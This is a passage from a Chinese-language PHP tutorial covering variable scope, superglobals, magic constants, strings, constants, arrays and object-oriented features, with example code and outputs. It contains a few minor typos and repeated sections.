$y;//输出30\n?>\n\n上面例子也可以写成：\n\n&lt;?php\n $x=5;\n $y=10;\n function myTest()\n {\n     $GLOBALS['y']=$GLOBALS['x']+$GLOBALS['y'];\n }\n myTest();\n echo $y;\n?>\n\n注意：不可在global 后写 $变量 = 值。\n&lt;?php\n$a = 10;\n$b = 100;\nfunction test(){\n   global $a , $b;\n   echo $a + $b;\n}\n//结果是不是显示出来了？\ntest();\n?>\n\n&emsp;1.通过$GLOBLAS来读取外部变量\n&lt;?php\n\n$one = 10;\n\nfunction demo(){\n   $two = 100;\n\n   $result = $two + $GLOBALS['one'];\n\n   return $result;\n\n}\n//你会发现结果变成了110\necho demo();\n?>\n\n\n上例中：我们将函数体外的变量通过$GLOBALS拿到了函数体使用。所以，打破了函数外的变量不能在函数体内使用的限定。\n\n&emsp;\nstatic 作用域：当一个函数完成时，它的所有变量通常都会被删除。然而，有时候您希望某个局部变量不要被删除。要做到这一点，请在您第一次声明变量时使用 static 关键字：\n\n&lt;?php\n function myTest()\n {\n     static $x=0;\n     echo $x;\n     $x++;\n }\n myTest();\n myTest();\n myTest();\n myTest();\n ?>\n\n&emsp;2.通过$GLOBLAS，在函数内修改外部变量\n&lt;?php\n\n$hongniu = '我是一个兵，来自老百姓';\n\nfunction test(){\n\n   echo '执行了函数test哟&lt;br />';\n   //调用test()函数，将通过$GLOBALS['hongniu'],把$hongniu的值改变掉\n\n   $GLOBALS['hongniu'] = '帮助别人很快乐';\n}\n\ntest();\n//发现是不是输出的值变了呀？\necho $hongniu;\n?>\n\n\n通过上例：我们发现通过$GLOBALS[‘hongniu’],把$hongniu的值改变掉，所以在最后输出$hongniu的时候，值发生了变化。\n\n&emsp;3.通过$GLOBLAS，在函数内创建全局变量\n&lt;?php\n\nfunction hello(){\n\n   $GLOBALS['que'] = '提神喝茶更好哟';\n\n   echo '你调了一下函数hello&lt;br />';\n}\n\nhello();\n\necho $que;\n?>\n\n\n上例中，我们发现$que是不存在的，可以调用函数hello()后，在函数外部可以执行echo $que了，能够看到结果：提神喝茶更好。我们明白了，函数内声明的变量，通过$GLOBALS声明一个变量，也能够显示出来。\n\n&emsp;下面的知识是【了解】级别，我们越来越少的使用这种方式来声明全局变量了。在函数内使用global关键词后面跟一个或多个变量，就把变量变为了全局变量，格式如下：\n&lt;?php\n$a = 10;\n$b = 100;\nfunction test(){\n   global $a , $b;\n   echo $a + $b;\n}\n//结果是不是显示出来了？\ntest();\n?>\n\n&emsp;\n4. PHP 全局变量 - 超全局变量：PHP 中的许多预定义变量都是“超全局的”，这意味着它们在一个脚本的全部作用域中都可用。在函数或方法中无需执行 global$变量名; 就可以访问它们。PHP 超级全局变量列表： &emsp;[PHP 全局变量 - 超全局变量]$GLOBALS$_SERVER$_REQUEST$_POST$_GET$_FILES$_ENV$_COOKIE$_SESSION\n\n&emsp;\n5. PHP 系统变量（魔术常量）：PHP 向它运行的任何脚本提供了大量的预定义常量。不过很多常量都是由不同的扩展库定义的，只有在加载了这些扩展库时才会出现，或者动态加载后，或者在编译时已经包括进去了。有八个魔术常量它们的值随着它们在代码中的位置改变而改变。 \n\n使用方法参见\n\n\n\n常量符号\n意义\n\n\n\n\n __LINE__\n文件中的当前行号\n\n\n __FILE__\n文件的完整路径和文件名。如果用在被包含文件中，则返回被包含的文件名。自 PHP 4.0.2 起，__FILE__ 总是包含一个绝对路径（如果是符号连接，则是解析后的绝对路径），而在此之前的版本有时会包含一个相对路径。\n\n\n__DIR__\n文件所在的目录。如果用在被包括文件中，则返回被包括的文件所在的目录。它等价于 dirname(__FILE__)。除非是根目录，否则目录中名不包括末尾的斜杠。（PHP 5.3.0中新增）\n\n\n __FUNCTION__\n函数名称（PHP 4.3.0 新加）。自PHP5起本常量返回该函数被定义时的名字（区分大小写）。在 PHP 4 中该值总是小写字母的。\n\n\n __CLASS__\n类的名称（PHP 4.3.0 新加）。自 PHP 5起本常量返回该类被定义时的名字（区分大小写）\n\n\n __TRAIT__\nTrait 的名字（PHP 5.4.0 新加）。自 PHP 5.4.0 起，PHP实现了代码复用的一个方法，称为 traits。\n\n\n __METHOD__\n类的方法名（PHP 5.0.0 新加）。返回该方法被定义时的名字（区分大小写）。\n\n\n\n&emsp;&emsp;\n1.3 PHP 数据类型1. PHP的数据类型包括以下几种：Integer（整型）、String（字符串）、Float（浮点型）、Boolean（布尔型）、Array（数组）、Object（对象）、NULL（空值）2. 查看变量数据类型：1. gettype(传入一个变量) 能够获得变量的类型2. var_dump(传入一个变量)  输出变类型和值 （最常用）var_dump()是一个函数。向括号()中间插入变量。这个函数，会打印出来数据类型，还会对应显示变量的长度和值。\n\n&emsp;&emsp;\n1.4 PHP 字符串1. 字符串型可以用三种方法定义：单引号形式、双引号形式和Heredoc结构形式。2.单、双引号嵌套使用时注意事项：1.若单引号嵌套单引号或者双引号嵌套双号时：里层(被嵌套)的引号要用“\\”转义字符转义；2.单引号嵌套双引号或者双引号嵌套单引号时：不需要用转义字符。3.当美元符$在引号里时的区别：1.在双引号里：当双引号里包含变量时，变量会双引号里的内容连在一起；2.在单引号里：变量会被当做字符地输出，即“$”会被输出。\n\n\n&emsp;\n4. Heredoc结构(&lt;&lt;&lt;)：2).然后在&lt;&lt;&lt;后面写上字符（建议英文大写字符）。如下例中的：ABC3).然后换行写上任意想写的字符4).写完后，顶行。在行最开始处，再写上&lt;&lt;&lt;后面的字符和分号。如下例中的：ABC;\n\n&lt;?php\n$dingjie = &lt;&lt;&lt;ABC     //“=”和“&lt;&lt;&lt;”和“ABC”这三个标志符号\n这里是字符串的内容。\nABC;\n?>\n\n&emsp;\n5. PHP strlen()  函数：有时知道字符串值的长度是很有用的。strlen() 函数返回字符串的长度（字符数）。注意：在UTF-8下 strlen  把中文字符算成 3 个字节，英文，空格，符号占 1 个字节。&emsp;6. PHP strpos() 函数：strpos()函数用于在字符串内查找一个字符或一段指定的文本。如果在字符串中找到匹配，该函数会返回第一个匹配的字符位置。如果未找到匹配，则返回 FALSE。实例:下面的实例在字符串 “Hello world!” 中查找文本 “world”：\n\n&lt;?php\n echo strpos(\"Hello world!\",\"world\");\n ?>\n运行结果：6\n\n\n\n提示：在上面的实例中，字符串 “world” 的位置是 6。之所以是 6 而不是 7 的原因是，字符串中第一个字符的位置是 0，而不是 1。\n\n\n&emsp;&emsp;\n1.5 PHP 常量1. 自定义常量：(1) 常量是单个值的标识符（名称）。在脚本中无法改变该值。(2) 有效的常量名以字符或下划线开头（常量名称前面没有 $ 符号）。(3) 常量名可以小写，但是通常大写。(4) 常量是全局的，常量在定义后，默认是全局变量，可以在整个运行的脚本的任何地方使用。定义方法：如需设置常量，请使用 define() 函数 - 它使用三个参数：1. 首个参数定义常量的名称2. 第二个参数定义常量的值3. 可选的第三个参数规定常量名是否对大小写敏感。默认是 false。注意关于define和const定义的区别：可以用 define() 函数来定义常量。在 PHP 5.3.0 以后，可以使用 const  关键字在类定义的外部定义常量，先前版本const 关键字只能在类（class）中使用。一个常量一旦被定义，就不能再改变或者取消定义。常量只能包含标量数据（boolean，integer，float 和 string）。 可以定义 resource 常量，但应尽量避免，因为会造成不可预料的结果。\n\ndefine定义方式：\n&lt;?php\n$p = \"PII\";\ndefine(\"PI\",3.14);define($p,3.14);\ndefine($p,3.14);\necho PI;\necho \"&lt;br />\";\necho PII;\n?>\n运行结果：\n3.14\n3.14\n\n&emsp;\nconst定义方式：\n希望一个成员变量不被修改 例如圆周率 3.1415926\n定义：const 常量名=值; 没有$符\n访问：类名 ::常量名 或 接口名::常量名\n\n&lt;?php　　　　　　　　　　　　　　　　　　　　　　defined('TEXT');检查一个名称的常量是否存在\n class A{\n const TAX_RATE=0.08;\n public function payTax($var){\n return $var*A::TAX_RATE;\n}\n}\n$a=new A();\necho $a->payTax(200):\n?>\n\n&emsp;\n用法一：const用于类成员变量，一经定义不可修改，define用于全局常量，不可用于类成员变量的定义，const可在类中使用，define不能。用法二：const定义的常量大小写敏感，而define可通过第三个参数(为TRUE表示大小写不敏感)来指定大小写是否敏感。在运行时定义一个常量。define(‘TXE’,100,TRUE);用法三：const不能在条件语句中定义常量，而define函数可以。if($a&gt;10){define(‘LE’,’hello’);\n\n&emsp;\n2. 判定常量是否被定义：如果常量被重复定义以后，PHP解析器会发出“Constant XXX already defined”的警告，提醒我们该常量已经被定义过。那么，在团队开发，或代码量很大的情况下，我们如何去判定一个常量是否被定义呢？defined()函数可以帮助我们判断一个常量是否已经定义，其语法格式为：bool defined(string constants_name)它只有参数constant_name，指的是要获取常量的名称，若存在则返回布尔类型true，否则返回布尔类型false; （注：bool表示函数返回值类型为布尔类型）\n\n&lt;?php \ndefine(\"PI1\",3.14);\n$p = \"PI1\";\n$is1 = defined($p);\n$is2 = defined(\"PI2\");\nvar_dump($is1);\nvar_dump($is2);\n?>\n\n&emsp;\n3. PHP 全局变量 - 超全局变量：PHP 中的许多预定义变量都是“超全局的”，这意味着它们在一个脚本的全部作用域中都可用。在函数或方法中无需执行 global$变量名; 就可以访问它们。PHP 超级全局变量列表： &emsp;[PHP 全局变量 - 超全局变量]$GLOBALS$_SERVER$_REQUEST$_POST$_GET$_FILES$_ENV$_COOKIE$_SESSION\n\n&emsp;\n4. PHP 系统变量（魔术常量）：PHP 向它运行的任何脚本提供了大量的预定义常量。不过很多常量都是由不同的扩展库定义的，只有在加载了这些扩展库时才会出现，或者动态加载后，或者在编译时已经包括进去了。有八个魔术常量它们的值随着它们在代码中的位置改变而改变。 \n\n使用方法参见\n\n\n\n常量符号\n意义\n\n\n\n\n __LINE__\n文件中的当前行号\n\n\n __FILE__\n文件的完整路径和文件名。如果用在被包含文件中，则返回被包含的文件名。自 PHP 4.0.2 起，__FILE__ 总是包含一个绝对路径（如果是符号连接，则是解析后的绝对路径），而在此之前的版本有时会包含一个相对路径。\n\n\n__DIR__\n文件所在的目录。如果用在被包括文件中，则返回被包括的文件所在的目录。它等价于 dirname(__FILE__)。除非是根目录，否则目录中名不包括末尾的斜杠。（PHP 5.3.0中新增）\n\n\n __FUNCTION__\n函数名称（PHP 4.3.0 新加）。自PHP5起本常量返回该函数被定义时的名字（区分大小写）。在 PHP 4 中该值总是小写字母的。\n\n\n __CLASS__\n类的名称（PHP 4.3.0 新加）。自 PHP 5起本常量返回该类被定义时的名字（区分大小写）\n\n\n __TRAIT__\nTrait 的名字（PHP 5.4.0 新加）。自 PHP 5.4.0 起，PHP实现了代码复用的一个方法，称为 traits。\n\n\n __METHOD__\n类的方法名（PHP 5.0.0 新加）。返回该方法被定义时的名字（区分大小写）。\n\n\n\n&emsp;&emsp;\n1.6 PHP数组：索引数组、关联数组数组可以存入多个不同类型的数据，是一个复合数据类型。我们可以使用array() 来初始化数组，每个数组元素之间使用逗号分隔  ,在PHP5.4版本之后，数组的初始化更为简洁，用中括号[ ] 来初始化。数组的格式：$shuzu=array(key=&gt;value)key：键值  &emsp; value：键值对应值1. 索引数组：键值为整形（int）我们来总结规律：1.索引数组若不强制声明他的下标，他的下标是从0开始的。（我们的第一个数组的值：只有不断努力才能博得未来。这个值的下标为0）。2.如果我指定过下标他的下标就为我指定的值。如下标为5,10和下标为19的，都是我指定过的值。3.若某个值（如php.cn），强制指定了下标（下标为10）。在它后面加上的值（PHP学院），不指定下标的话。他们的下标增长规律为最大值+1。 \n\n&lt;?php\n header(\"Content-type:text/html;charset=utf-8\");    //设置编码\n $array=array(100,1.34,true,\"PHP中文网\",);\n echo '&lt;pre>';\n var_dump($array);\n echo '&lt;pre/>';\n ?>\n\n&emsp;\n2. 关联数组：键值中只要有一个为字符串（String）类型即称为关联数组）那我们来声明一下关联数组。跟索引数组的声明方式完成一样。不过不同的是，必须要指定字符串的下标和必须要使用键值对应符。我们通过实验知道：1.声明关联数组是 键名 =&gt; 值。2.在关联数组可以有索引数组的元素。 \n\n&lt;?php\n $arr=[            //用[ ]创建数组\n     'name'=>'Tom',\n     'age'=>'18',\n     'gender'=>'male'\n ];\n echo \"&lt;pre>\";\n var_dump($arr) ;\n echo\"&lt;/pre>\"\n ?>\n\n运行结果：array(3) {\n  [\"name\"]=>\n  string(3) \"Tom\"\n  [\"age\"]=>\n  string(2) \"18\"\n  [\"gender\"]=>\n  string(4) \"male\"\n}\n\n\n\n注：上例中echo pre这个标签的主要目的是为原样输出，格式展示的更好看，更清晰。\n\n\n&emsp;\n3. 索引数组和关联数组遍历分别用for和foreach1. 索引数组：使用for遍历 \n\n&lt;?php\n $arr=Array('tom','andy','jack');\n $arrlength=count($arr);\n for($x=0;$x&lt;$arrlength;$x++){\n     echo $arr[$x];\n     echo  \"&lt;br/>\";\n } \n ?>\n\n&emsp;\n2. 关联数组：使用foreach遍历foreach的基本语法：有一个布尔型循环是专门用来循环数组的。这个循环的基本语法就是foreach基本语法foreach( 要循环的数组变量 as [键变量 =&gt;] 值变量){    //循环的内容}这是一个固定用法，将要循环的数组放进去。as 是一个固定的关键字；后面的键变量是可选的，随意定义一个变量，每次循环的时候，foreach这个语法会把键取出来赋值到键变量里面；后面的值变量是必填的。每次循环的时候，会把值放到值变量里面。我们下面用代码来举例子，加强对这个语法的理解。 \n\n&lt;?php\n $arr=[\n     'name'=>'Tom',\n     'age'=>'18',\n     'gender'=>'male'\n ];\n foreach($arr as $key=>$value){\n     echo $key.\": \".$value.\"&lt;br />\";\n };\n?>\n运行结果：\nname: Tom\nage: 18\ngender: male\n\n&emsp;\n通过上面的运行结果我们得出下面的结果：1.每次循环的时候，把下标赋值给了变量$key，把值的变量赋值给了变量$value2.循环一次读一次键和值。读到最后，发现没有可以读取的数组元素后，停止循环遍历数据。注意：$key 和$value并不是变量名必须得为这两个名字。你命名为其他的也可以，如 $kai =&gt; $wen是一样的。 你要清楚键赋值给了哪个变量，值赋值给了另外的哪个变量。3. 通过foreach遍历不连续的索引数组，如下例： \n\n&lt;?php\n header(\"Content-type:text/html;charset=utf-8\");    //设置编码\n $data = array(\n     0 => '中国',\n     100 => '美国',\n     20 => '韩国',\n     300 => '德国',\n ); \n foreach($data as $k => $v){\n     echo $k . '------' . $v .'&lt;br />';\n }\n?>\n运行结果：\n0------中国\n100------美国\n20------韩国\n300------德国\n\n按照foreach的结果推理与刚刚做的关联数组的结果是一样的。不同的是不连续的索引数组。每读一次数组的元素，将当次循环的下标赋值给了变量$k，值赋值给了变量$v。（即不像for循环一样的循环遍历） 每读将键和值输出，然后显示出来。循环一次向后移动一次下标。读取至最后，退出执行。\n\n&emsp;\n4. foreach遍历遍历多维数组：\n\n\n&lt;?php\n\n$data = array(\n\n       0 => array(\n           '中国' => 'china',\n           '美国' => 'usa',\n           '德国' => ' Germany',\n       ),\n\n       1 => array(\n           '湖北' => 'hubei',\n           '河北' => 'hebei',\n           '山东' => 'shandong',\n           '山西' => 'sanxi',\n       ),\n\n);\n\n//注：我们在使用foreach循环时，第一次循环将键为0和键为1的两个数组赋值给一个变量($value)。然后，\n//再套一个循环遍历这个$value变量，$value中的值取出来，赋值给$k和$v。\n\nforeach($data as $value){\n\n   //第一次循环把国家的数组赋值给了$value\n   //第二次循环把中国的省份的数组又赋值给了$value\n   //因此，我在循环的时候把$value再遍历一次\n\n   foreach($value as $k => $v){\n           echo $k . '-----' . $v .'&lt;br />';\n   }\n\n   //为了看的更清晰，我在中间加上华丽丽的分割线方便你来分析\n\n   echo '----------分割线-----------&lt;br />';\n\n}\n\n?>\n\n\n总结：\n\n第一次循环的时候，将数组赋值给了$value，然后用foreach循环$value。将二维的子数组中的键给到$k，值赋值给变量$v。\n第一次循环退出子数组的循环，执行后续代码显示分割线。\n依此类推，第二次循环也是这样。\n\n\n&emsp;\n5. 统计数组元素个数数组是我们最常用到的类型，那如何计算某个一维数组的个数呢。其实我们可以用到我们之前学过的数学函数里面的一个：count()。count($变量) 函数用于返回数组的长度（元素数）：\n\n&lt;?php\n$name=Array('tom','andy','jack');\necho count($name);\n?>\n\n&emsp;\n6. PHP 数组排序数组中的元素可以按字母或数字顺序进行降序或升序排列。升序：从小到大的顺序进行排序，如果是英文单词，那么按字母A-Za-z的顺序排序，如果是数字，那么按数字的大小进行排序。降序：与升序相反   sort() - 对数组进行升序排列   rsort() - 对数组进行降序排列   asort() - 根据关联数组的值，对数组进行升序排列   ksort() - 根据关联数组的键，对数组进行升序排列   arsort() - 根据关联数组的值，对数组进行降序排列   krsort() - 根据关联数组的键，对数组进行降序排列\n\n&emsp;\n7. 数组函数[PHP 数组函数]\n\n\n&emsp;&emsp;\n1.7 PHP 命名空间[参见本站博客：PHP-命名空间]\n\n\n&emsp;&emsp;\n1.8 PHP 面向对象\n 类：  定义了一件事物的抽象特点。类的定义包含了数据的形式以及对数据的操作。\n 对象：  是类的实例。\n 成员变量：  定义在类内部的变量。该变量的值对外是不可见的，但是可以通过成员函数访问，在类被实例化为对象后，该变量即可称为对象的属性。\n 成员函数：  定义在类的内部，可用于访问对象的数据。\n 继承：  继承性是子类自动共享父类数据结构和方法的机制，这是类之间的一种关系。在定义和实现一个类的时候，可以在一个已经存在的类的基础之上来进行，把这个已经存在的类所定义的内容作为自己的内容，并加入若干新的内容。\n 父类：  一个类被其他类继承，可将该类称为父类，或基类，或超类。\n 子类：  一个类继承其他类称为子类，也可称为派生类。\n 多态：  多态性是指相同的操作或函数、过程可作用于多种类型的对象上并获得不同的结果。不同的对象，收到同一消息可以产生不同的结果，这种现象称为多态性。\n 重载：  简单说，就是函数或者方法有同样的名称，但是参数列表不相同的情形，这样的同名不同参数的函数或者方法之间，互相称之为重载函数或者方法。\n 抽象性：  抽象性是指将具有一致的数据结构（属性）和行为（操作）的对象抽象成类。一个类就是这样一种抽象，它反映了与应用有关的重要性质，而忽略其他一些无关内容。任何类的划分都是主观的，但必须与具体的应用有关。\n 封装： 封装是指将现实世界中存在的某个客体的属性与行为绑定在一起，并放置在一个逻辑单元内。\n 构造函数：  主要用来在创建对象时初始化对象，即为对象成员变量赋初始值，总与new运算符一起使用在创建对象的语句中。\n 析构函数：  析构函数(destructor) 与构造函数相反，当对象结束其生命周期时（例如对象所在的函数已调用完毕），系统自动执行析构函数。析构函数往往用来做”清理善后” 的工作（例如在建立对象时用new开辟了一片内存空间，应在退出前在析构函数中用delete释放）。\n\n&emsp;\n1. 构造函数构造函数 ，是一种特殊的方法。主要用来在创建对象时初始化对象， 即为对象成员变量赋初始值，总与new运算符一起使用在创建对象的语句中。 PHP 5 允行开发者在一个类中定义一个方法作为构造函数，语法格式如下： void  __construct ([ mixed $args [, $… ]] ) 在上面的例子中我们就可以通过构造方法来初始化 $url 和 $title 变量：\n\n function __construct( $par1, $par2 ) {\n   $this->url = $par1;\n   $this->title = $par2;\n}\n\n示例代码：\n&lt;?php\n header(\"Content-type:text/html;charset=utf-8\");    //设置编码\n class Site {\n     /* 成员变量 */\n     var $url;\n     var $title;\n\n     /* 成员函数 */\n     function setUrl($par){\n         $this->url = $par;\n     }\n\n     function getUrl(){\n         echo $this->url .\"&lt;br/>\";\n     }\n\n     function setTitle($par){\n         $this->title = $par;\n     }\n\n     function getTitle(){\n         echo $this->title . \"&lt;br/>\";\n     }\n     function __construct( $par1, $par2 ) {\n         $this->url = $par1;\n         $this->title = $par2;\n     }\n }\n\n // 调用成员函数，设置标题和URL\n $php = new Site('www.php.cn', 'php中文网');\n $taobao = new Site('www.taobao.com', '淘宝');\n $google = new Site('www.google.com', 'Google 搜索');\n\n // 调用成员函数，获取标题和URL\n $php->getTitle();\n $taobao->getTitle();\n $google->getTitle();\n\n $php->getUrl();\n $taobao->getUrl();\n $google->getUrl();\n ?>\n\n&emsp;\n2. 析构函数析构函数(destructor) 与构造函数相反，当对象结束其生命周期时（例如对象所在的函数已调用完毕），系统自动执行析构函数。\n\n&lt;?php\n header(\"Content-type:text/html;charset=utf-8\");    //设置编码\n class MyDestructableClass {\n     function __construct() {\n         print \"构造函数\\n\";\n         $this->name = \"MyDestructableClass\";\n     }\n\n     function __destruct() {\n         print \"销毁 \" . $this->name . \"\\n\";\n     }\n }\n\n $obj = new MyDestructableClass();\n?>\n\n示例代码：\n&lt;?php\n header(\"Content-type:text/html;charset=utf-8\");    //设置编码\n class MyDestructableClass {\n     function __construct() {\n         print \"构造函数\\n\";\n         $this->name = \"MyDestructableClass\";\n     }\n\n     function __destruct() {\n         print \"销毁 \" . $this->name . \"\\n\";\n     }\n }\n\n $obj = new MyDestructableClass();\n?>\n\n&emsp;\n3. 继承PHP 使用关键字 extends 来继承一个类，PHP 不支持多继承，格式如下：\n\nclass Child extends Parent {\n   // 代码部分\n}\n\n示例代码：\n&lt;?php\n// 子类扩展站点类别\nclass Child_Site extends Site {\n    var $category;\n    function setCate($par){\n        $this->category = $par;\n    }\n    function getCate(){\n        echo $this->category . \"&lt;br/>\";\n    }\n}\n?>\n\n&emsp;\n4. 方法重写如果从父类继承的方法不能满足子类的需求，可以对其进行改写，这个过程叫方法的覆盖（override），也称为方法的重写。下面的例中重写了 getUrl 与 getTitle 方法：\n\nfunction getUrl() {\necho $this->url . PHP_EOL;\nreturn $this->url;\n}\n\nfunction getTitle(){\necho $this->title . PHP_EOL;\nreturn $this->title;\n}\n\n&emsp;\n5. 访问控制PHP 对属性或方法的访问控制，是通过在前面添加关键字 public（公有），protected（受保护）或 private（私有）来实现的。public（公有）：公有的类成员可以在任何地方被访问。protected（受保护）：受保护的类成员则可以被其自身以及其子类和父类访问。private（私有）：私有的类成员则只能被其定义所在的类访问。(1) 属性的访问控制类属性必须定义为公有，受保护，私有之一。如果用 var 定义，则被视为公有。\n\n代码示例：\n&lt;?php\n /**\n  * Define MyClass\n  */\n class MyClass\n {\n     public $public = 'Public';\n     protected $protected = 'Protected';\n     private $private = 'Private';\n\n     function printHello()\n     {\n         echo $this->public;\n         echo $this->protected;\n         echo $this->private;\n     }\n }\n\n $obj = new MyClass();\n echo $obj->public; // 这行能被正常执行\n echo $obj->protected; // 这行会产生一个致命错误\n echo $obj->private; // 这行也会产生一个致命错误\n $obj->printHello(); // 输出 Public、Protected 和 Private\n\n\n /**\n  * Define MyClass2\n  */\n class MyClass2 extends MyClass\n {\n     // 可以对 public 和 protected 进行重定义，但 private 而不能\n     protected $protected = 'Protected2';\n\n     function printHello()\n     {\n         echo $this->public;\n         echo $this->protected;\n         echo $this->private;\n     }\n }\n\n $obj2 = new MyClass2();\n echo $obj2->public; // 这行能被正常执行\n echo $obj2->private; // 未定义 private\n echo $obj2->protected; // 这行会产生一个致命错误\n $obj2->printHello(); // 输出 Public、Protected2 和 Undefined\n\n?>\n\n&emsp;\n(2) 方法的访问控制类中的方法可以被定义为公有，私有或受保护。如果没有设置这些关键字，则该方法默认为公有。\n\n示例代码：\n&lt;?php\n /**\n  * Define MyClass\n  */\n class MyClass\n {\n     // 声明一个公有的构造函数\n     public function __construct() { }\n\n     // 声明一个公有的方法\n     public function MyPublic() { }\n\n     // 声明一个受保护的方法\n     protected function MyProtected() { }\n\n     // 声明一个私有的方法\n     private function MyPrivate() { }\n\n     // 此方法为公有\n     function Foo()\n     {\n         $this->MyPublic();\n         $this->MyProtected();\n         $this->MyPrivate();\n     }\n }\n\n $myclass = new MyClass;\n $myclass->MyPublic(); // 这行能被正常执行\n $myclass->MyProtected(); // 这行会产生一个致命错误\n $myclass->MyPrivate(); // 这行会产生一个致命错误\n $myclass->Foo(); // 公有，受保护，私有都可以执行\n\n\n /**\n  * Define MyClass2\n  */\n class MyClass2 extends MyClass\n {\n     // 此方法为公有\n     function Foo2()\n     {\n         $this->MyPublic();\n         $this->MyProtected();\n         $this->MyPrivate(); // 这行会产生一个致命错误\n     }\n }\n\n $myclass2 = new MyClass2;\n $myclass2->MyPublic(); // 这行能被正常执行\n $myclass2->Foo2(); // 公有的和受保护的都可执行，但私有的不行\n\n class Bar\n {\n     public function test() {\n         $this->testPrivate();\n         $this->testPublic();\n     }\n\n     public function testPublic() {\n         echo \"Bar::testPublic\\n\";\n     }\n\n     private function testPrivate() {\n         echo \"Bar::testPrivate\\n\";\n     }\n }\n\n class Foo extends Bar\n {\n     public function testPublic() {\n         echo \"Foo::testPublic\\n\";\n     }\n\n     private function testPrivate() {\n         echo \"Foo::testPrivate\\n\";\n     }\n }\n\n $myFoo = new foo();\n $myFoo->test(); // Bar::testPrivate\n // Foo::testPublic\n?>\n\n&emsp;\n6. 接口使用接口（interface），可以指定某个类必须实现哪些方法，但不需要定义这些方法的具体内容。接口是通过 interface关键字来定义的，就像定义一个标准的类一样，但其中定义所有的方法都是空的。接口中定义的所有方法都必须是公有，这是接口的特性。要实现一个接口，使用 implements 操作符。类中必须实现接口中定义的所有方法，否则会报一个致命错误。类可以实现多个接口，用逗号来分隔多个接口的名称。 \n\n示例代码：\n&lt;?php\n// 声明一个'iTemplate'接口\ninterface iTemplate\n{\n    public function setVariable($name, $var);\n    public function getHtml($template);\n}\n// 实现接口\nclass Template implements iTemplate\n{\n    private $vars = array();\n    public function setVariable($name, $var)\n    {\n        $this->vars[$name] = $var;\n    }\n    public function getHtml($template)\n    {\n        foreach($this->vars as $name => $value) {\n            $template = str_replace('{' . $name . '}', $value, $template);\n        }\n        return $template;\n    }\n}\n?>\n\n&emsp;\n7. 常量可以把在类中始终保持不变的值定义为常量。在定义和使用常量的时候不需要使用 $ 符号。常量的值必须是一个定值，不能是变量，类属性，数学运算的结果或函数调用。自 PHP 5.3.0 起，可以用一个变量来动态调用类。但该变量的值不能为关键字（如 self，parent 或 static）。 \n\n示例代码：\n&lt;?php\n class MyClass\n {\n     const constant = '常量值';\n\n     function showConstant() {\n         echo  self::constant . \"&lt;br/>\";\n     }\n }\n\n echo MyClass::constant . \"&lt;br/>\";\n\n $classname = \"MyClass\";\n echo $classname::constant . \"&lt;br/>\"; // 自 5.3.0 起\n\n $class = new MyClass();\n $class->showConstant();\n\n echo $class::constant . \"&lt;br/>\"; // 自 PHP 5.3.0 起\n?>\n\n&emsp;\n8. 抽象类任何一个类，如果它里面至少有一个方法是被声明为抽象的，那么这个类就必须被声明为抽象的。定义为抽象的类不能被实例化。被定义为抽象的方法只是声明了其调用方式（参数），不能定义其具体的功能实现。继承一个抽象类的时候，子类必须定义父类中的所有抽象方法；另外，这些方法的访问控制必须和父类中一样（或者更为宽松）。例如某个抽象方法被声明为受保护的，那么子类中实现的方法就应该声明为受保护的或者公有的，而不能定义为私有的。此外方法的调用方式必须匹配，即类型和所需参数数量必须一致。例如，子类定义了一个可选参数，而父类抽象方法的声明里没有，则两者的声明并无冲突。 \n\n示例代码：\n&lt;?php\nclass ConcreteClass1 extends AbstractClass\n{\n    protected function getValue() {\n        return \"ConcreteClass1\";\n    }\n    public function prefixValue($prefix) {\n        return \"{$prefix}ConcreteClass1\";\n    }\n}\nclass ConcreteClass2 extends AbstractClass\n{\n    public function getValue() {\n        return \"ConcreteClass2\";\n    }\n    public function prefixValue($prefix) {\n        return \"{$prefix}ConcreteClass2\";\n    }\n}\n$class1 = new ConcreteClass1;\n$class1->printOut();\necho $class1->prefixValue('FOO_') . \"&lt;br/>\";\n$class2 = new ConcreteClass2;\n$class2->printOut();\necho $class2->prefixValue('FOO_') . \"&lt;br/>\";\n?>\n\n程序运行结果：\nConcreteClass1\nFOO_ConcreteClass1\nConcreteClass2\nFOO_ConcreteClass2\n\n&emsp;\n9. Static 关键字声明类属性或方法为 static(静态)，就可以不实例化类而直接访问。静态属性不能通过一个类已实例化的对象来访问（但静态方法可以）。由于静态方法不需要通过对象即可调用，所以伪变量 $this 在静态方法中不可用。静态属性不可以由对象通过 -&gt; 操作符来访问。自 PHP 5.3.0 起，可以用一个变量来动态调用类。但该变量的值不能为关键字 self，parent 或 static。 \n\n示例代码：\n&lt;?php\nclass Foo {\npublic static $my_static = 'foo';\npublic function staticValue() {\nreturn self::$my_static;\n}\n}\nprint Foo::$my_static . \"&lt;br/>\";\n$foo = new Foo();\nprint $foo->staticValue() . \"&lt;br/>\";\n?>\n\n程序运行结果：\nfoo\nfoo\n\n&emsp;\n10. Final 关键字PHP 5 新增了一个 final 关键字。如果父类中的方法被声明为 final，则子类无法覆盖该方法。如果一个类被声明为 final，则不能被继承。\n\n代码示例：\n&lt;?php\n class BaseClass {\n     public function test() {\n         echo \"BaseClass::test() called\" . PHP_EOL;\n     }\n\n     final public function moreTesting() {\n         echo \"BaseClass::moreTesting() called\"  . PHP_EOL;\n     }\n }\n\n class ChildClass extends BaseClass {\n     public function moreTesting() {\n         echo \"ChildClass::moreTesting() called\"  . PHP_EOL;\n     }\n }\n // 报错信息 Fatal error: Cannot override final method BaseClass::moreTesting()\n?>\n\n程序运行结果：\nFatal error:  Cannot override final method BaseClass::moreTesting() in D:\\WWW\\Basis\\oop\\opp_9.php on line 16\n\n&emsp;\n11.调用父类构造方法PHP 不会在子类的构造方法中自动的调用父类的构造方法。要执行父类的构造方法，需要在子类的构造方法中调用 parent::__construct() \n\n代码示例：\n&lt;?php\n header(\"Content-type:text/html;charset=utf-8\");    //设置编码\n class BaseClass {\n     function __construct() {\n         print \"BaseClass 类中构造方法\" . \"&lt;br/>\";\n     }\n }\n class SubClass extends BaseClass {\n     function __construct() {\n         parent::__construct();  // 子类构造方法不能自动调用父类的构造方法\n         print \"SubClass 类中构造方法\" . \"&lt;br/>\";\n     }\n }\n class OtherSubClass extends BaseClass {\n     // 继承 BaseClass 的构造方法\n }\n\n // 调用 BaseClass 构造方法\n $obj = new BaseClass();\n\n // 调用 BaseClass、SubClass 构造方法\n $obj = new SubClass();\n\n // 调用 BaseClass 构造方法\n $obj = new OtherSubClass();\n?>\n\n程序运行结果：\nBaseClass 类中构造方法\nBaseClass 类中构造方法\nSubClass 类中构造方法\nBaseClass 类中构造方法\n\n&emsp;&emsp;\n1.9 PHP 函数[参见本站博客：PHP-函数]\n\n\n&emsp;&emsp;\n二、 